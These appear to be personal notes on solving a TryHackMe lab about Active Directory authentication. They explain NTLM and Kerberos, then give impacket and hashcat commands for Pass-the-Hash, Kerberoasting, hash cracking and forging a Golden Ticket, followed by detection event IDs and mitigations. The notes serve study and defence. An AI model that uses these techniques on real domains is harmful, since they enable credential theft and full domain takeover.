# Intro to AD Authentication (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Active Directory (room 2, after [[active-directory-basics]]).
  The **attack** side: how NTLM and Kerberos authenticate, then six flags each via a different auth weakness.
- **Date:** 2026-10-19.
- **Status:** SOLVED - all 6 flags **captured and verified** (read live off the shares via impacket).
- **Network:** THM network room on `<ip>/24` (its own OVPN). `ROOTDC.THM.LOC` `<ip>`
  (KDC/DC, `thm.loc`), `SERVER1.thm.loc` `<ip>` (file server with `SHARE1`-`SHARE6`).
- **Method:** fully headless from the Windows PC with impacket (no AttackBox) - SMB NTLM/PtH, forged
  Kerberos tickets via `ticketer.py`, `kerberosLogin(useCache=True)`.

## Concept answers

| Task | Question | Answer |
|---|---|---|
| 2 | Process that proves identity | *(find it yourself)* |
| 2 | Process that decides access | *(find it yourself)* |
| 3 | NTLM: client auths to the DC or the service? | *(find it yourself)* |
| 3 | Random value the server sends | *(find it yourself)* |
| 4 | Ticket used to request service tickets | *(find it yourself)* |
| 4 | Account whose hash encrypts all TGTs | *(find it yourself)* |
| 4 | Env var for the Kerberos ccache | *(find it yourself)* |
| 6 | Event ID when a Kerberos TGT is requested | *(find it yourself)* |
| 6 | PtH (4624) Authentication Package value | *(find it yourself)* |

Key idea: **NTLM** = you authenticate *to the service*, which then checks you with the DC (challenge-response,
password/hash never sent). **Kerberos** = you authenticate *to the KDC first*, get a TGT (encrypted with
the **KRBTGT** hash), then exchange it for per-service tickets (TGS). Nearly every AD attack targets a flaw
in one of these two.

## The six flags (all on `SERVER1.thm.loc`)

```python
# flag1 - NTLM auth as claire (challenge-response over SMB)
SMBConnection('<ip>').login('claire','<redacted-pw>','thm.loc')   # -> SHARE1/flag1.txt

# flag4 - Pass-the-Hash as ben (NT hash used directly, no plaintext)
SMBConnection('<ip>').login('ben','',domain='thm.loc',lmhash='',nthash='<redacted-hash>')  # -> SHARE4

# flag6 - Golden Ticket: forge a TGT for Administrator with the KRBTGT hash
ticketer.py -nthash <redacted-hash> \
  -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
KRB5CCNAME=Administrator.ccache ->
SMBConnection(remoteName='SERVER1.thm.loc', remoteHost='<ip>').kerberosLogin(
    'Administrator','','thm.loc','','','', '<ip>', useCache=True)   # -> SHARE6 (and ALL shares)
```

Intended methods for the other three (the room walks through them):
- **flag2 (Kerberos, mary):** `getTGT.py thm.loc/mary:'<redacted-pw>' -dc-ip <ip>`
  -> `mary.ccache`, then `smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip ...` -> SHARE2.
- **flag3 (weak hashing, phillip):** crack NT hash `<redacted-hash>`
  (`hashcat -m 1000 ... rockyou`) -> auth as phillip -> SHARE3.
- **flag5 (Kerberoasting, svc_printer):** `GetUserSPNs.py thm.loc/claire:'<redacted-pw>' -request` ->
  `$krb5tgs$23$...` -> `hashcat -m 13100 ... rockyou` -> auth as svc_printer -> SHARE5.

**Shortcut taken:** the **Golden Ticket outranks all of them** - the forged Administrator ticket read
*every* `SHARE1-6` in a single `kerberosLogin`, so flag2/3/5 came out of that pass too (no rockyou crack
needed). That is exactly the point of a Golden Ticket: KRBTGT compromise = total, persistent domain
control. flag1 and flag4 were still taken via their own methods to demonstrate NTLM and PtH.

| # | Share | Technique | Flag |
|---|-------|-----------|------|
| 1 | SHARE1 | NTLM auth (claire:<redacted-pw>) | `THM{…}` |
| 2 | SHARE2 | Kerberos TGT (mary) | `THM{…}` |
| 3 | SHARE3 | crack phillip NT hash | `THM{…}` |
| 4 | SHARE4 | Pass-the-Hash (ben) | `THM{…}` |
| 5 | SHARE5 | Kerberoast svc_printer | `THM{…}` |
| 6 | SHARE6 | Golden Ticket (KRBTGT) | `THM{…}` |

## Detections (Task 6)

- **4768** Kerberos TGT requested; **4769** service ticket requested (Kerberoasting = spike of 4769, RC4
  `0x17` downgrade); **4771** pre-auth failed (AS-REP roast / brute force); **4624** logon (PtH = type 3,
  Auth Package **NTLM**, blank source address); **4625** failed logon (spray).
- Mitigations: Protected Users + disable NTLM (PtH); SMB signing + EPA (relay); gMSA/strong svc passwords
  (Kerberoast); protect/rotate KRBTGT twice (Golden Ticket); lockout policy (spray).

## Lessons learned

- **Four hashes-in, four auth bypasses:** cracking (flag3), PtH (flag4), Kerberoast (flag5), Golden Ticket
  (flag6) - a preview of the whole module. Each is a dedicated room later.
- **Golden Ticket is the apex.** With the KRBTGT hash + domain SID you forge a TGT for anyone; it reads
  everything and survives re-compromise until KRBTGT is reset *twice*. It made the other Kerberos/crack
  steps unnecessary for flag collection.
- **impacket on Windows does Kerberos fine:** `SMBConnection(remoteName=<SPN host>, remoteHost=<ip>)` +
  `kerberosLogin(..., kdcHost=<dc-ip>, useCache=True)` with `KRB5CCNAME` set - no `/etc/hosts`, no DNS,
  no AttackBox needed.
- **NTLM vs Kerberos in one line:** NTLM authenticates *to the service* (relayable, PtH-able, no mutual
  auth); Kerberos authenticates *to the KDC* first (mutual auth, but KRBTGT/ticket theft is catastrophic).

## Related

- [[active-directory-basics]] - previous room (building the forest).
- [[ad-module-plan]] / [[tryhackme-learning-buddy]] - trackers. Later rooms drill each attack here.
